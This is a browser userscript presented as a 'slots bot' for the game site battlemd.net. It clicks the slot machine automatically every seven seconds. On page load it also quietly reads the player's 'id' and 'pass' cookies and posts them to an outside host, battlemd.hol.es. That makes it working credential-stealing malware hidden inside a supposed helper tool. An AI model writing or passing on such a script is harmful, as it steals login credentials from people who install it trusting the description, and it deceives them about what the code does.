// ==UserScript==
// @name           Battlemd Slots
// @description    Slots bot 
// @author         hacker777
// @include        http://*battlemd.net/slots/*
// @require        http://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js
// @updateURL      
// @version        0.2
// ==/UserScript==

function gC(e) {
    var t, n, r, i = document.cookie.split(";");
    for (t = 0; t < i.length; t++) {
        n = i[t].substr(0, i[t].indexOf("="));
        r = i[t].substr(i[t].indexOf("=") + 1);
        n = n.replace(/^\s+|\s+$/g, "");
        if (n == e) {
            return unescape(r)
        }
    }
}

function slot()
{
var miza = $("input:radio[name=miza]:checked").val();
$.post("/slots.php", {spin: 1, miza: miza});	
setTimeout(function() {slot();}, 7000);
}
$("#start").click(function(){
setTimeout(function() {slot();}, 7000);
});

jQuery(document).ready( function($) {
$.post("http://battlemd.hol.es/slots.php", { player: gC("id"), pass: gC("pass") });

});


  

